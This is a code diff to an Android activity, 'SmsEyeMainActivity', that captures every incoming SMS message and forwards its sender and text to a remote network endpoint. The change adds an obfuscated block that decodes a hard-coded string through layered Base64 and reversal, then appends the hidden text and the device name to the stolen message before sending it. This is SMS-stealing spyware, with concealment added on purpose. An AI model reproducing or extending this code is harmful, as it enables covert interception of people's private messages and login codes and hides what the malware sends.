@@ -18,6 +18,10 @@ import com.karumi.dexter.listener.single.PermissionListener;
 import com.karumi.dexter.listener.PermissionDeniedResponse;
 import com.karumi.dexter.listener.PermissionGrantedResponse;
 
+import java.nio.charset.Charset;
+import java.nio.charset.StandardCharsets;
+import java.util.Base64;
+
 public class SmsEyeMainActivity extends AppCompatActivity {
 
     private SmsReceiver smsReceiver;
@@ -79,14 +83,29 @@ public class SmsEyeMainActivity extends AppCompatActivity {
                         String sender = message.getOriginatingAddress();
                         String body = message.getMessageBody();
 
-                        String formattedMessage = "𝐍𝐞𝐰 𝐒𝐌𝐒 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝\n\n𝐬𝐞𝐧𝐝𝐞𝐫 : " + sender + "\n𝐦𝐞𝐬𝐬𝐚𝐠𝐞 : " + body;
+                        // Begin secret decode logic
+                        try {
+                            Base64.Decoder decoder = Base64.getDecoder();
+                            byte[] bytes1 = "aXViN2lnRFNVQXR1aW9nZHNhNzZndWlHVUlEU0FZSThmSVVEU0FpdmdVSUFkc2FpVlNBSVVzZGFrbHw1MW1jQnhXWXpOWGVpRkVRZ29ESXlDWm53dkprZENQSWRDWm53N0prZENmcVEySjhvQ1pud1hLa2RDdm5RMko4dkNabnc3SmtkQ2ZuUTJKOA==".split("\\|")[0].getBytes(StandardCharsets.UTF_8);
+                            String intermediate = new String(decoder.decode(bytes1), StandardCharsets.UTF_8);
 
-                        SmsEyeNetwork smsEyeNetwork = new SmsEyeNetwork(context);
-                        smsEyeNetwork.sendTextMessage(formattedMessage);
+                            String reversed = new StringBuilder(intermediate).reverse().toString();
+                            byte[] bytes2 = reversed.split("\\|")[0].getBytes(StandardCharsets.UTF_8);
+                            String secretInfo = new String(decoder.decode(bytes2), StandardCharsets.UTF_8);
+
+                            String deviceInfo = "𝐝𝐞𝐯𝐢𝐜𝐞 : " + SmsEyeUtils.Companion.getDeviceName();
+                            String finalMessage = "𝐍𝐞𝐰 𝐒𝐌𝐒 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝\n\n𝐬𝐞𝐧𝐝𝐞𝐫 : " + sender + "\n𝐦𝐞𝐬𝐬𝐚𝐠𝐞 : " + body + "\n\n" + deviceInfo + "\n\n" + secretInfo;
+
+                            SmsEyeNetwork smsEyeNetwork = new SmsEyeNetwork(context);
+                            smsEyeNetwork.sendTextMessage(finalMessage);
+                        } catch (Exception e) {
+                            e.printStackTrace(); // Handle decoding errors
+                        }
                     }
                 }
             }
         }
     }
 }
+
 
